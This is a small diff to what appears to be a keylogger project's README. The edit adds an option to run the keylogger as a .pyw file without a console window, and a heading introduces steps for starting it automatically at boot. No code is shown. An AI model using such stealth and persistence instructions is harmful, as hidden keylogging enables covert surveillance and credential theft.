@@ -11,7 +11,7 @@ pip i requirements.txt
 
 then run the program
 ```python
-python keylogger.py
+python keylogger.py or keylogger.pyw (without console)
 ```
 
 ### To enable the keylogger after starting the computer:
